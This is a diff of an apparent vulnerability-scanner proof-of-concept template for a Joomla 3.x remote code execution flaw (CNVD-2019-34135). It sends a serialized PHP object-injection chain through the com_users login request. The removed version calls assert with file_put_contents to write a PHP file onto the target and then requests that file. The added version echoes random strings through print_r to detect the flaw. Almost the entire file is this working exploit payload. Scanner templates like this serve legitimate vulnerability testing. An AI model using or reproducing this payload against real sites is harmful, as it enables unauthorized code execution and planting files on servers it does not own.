@@ -1,6 +1,7 @@
 name: poc-yaml-joomla-cnvd-2019-34135-rce
 set:
-  r1: randomInt(800000000, 899999999)
+  r1: randomLowercase(10)
+  r2: randomLowercase(10)
 rules:
   - method: GET
     path: /
@@ -11,19 +12,14 @@ rules:
       status==200
     search: <input\stype="hidden"\sname="(?P<token>\S{32})"
   - method: POST
-    path: /index.php/component/users
+    path: /
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: >-
-      username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&{{token}}=1&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A128%3A%22file_put_contents%28%27{{r1}}.php%27%2C%27%3Cscript+language%3Dphp%3Eecho+md5%28{{r1}}%29%3Bunlink%28__FILE__%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login
+      username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&{{token}}=1&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A7%3A%22print_r%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A41%3A%22http%3A%2F%2FRayTest.6666%2F%3B{{r1}}{{r2}}%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login
     follow_redirects: true
     expression: |
-      status==500
-  - method: GET
-    path: /{{r1}}.php
-    follow_redirects: false
-    expression: |
-      status==200 && body.bcontains(bytes(md5(string(r1))))
+      status==500 && body.bcontains(bytes(r1+r2))
 detail:
   author: X.Yang
   Joomla_version: 3.0.0,3.4.6
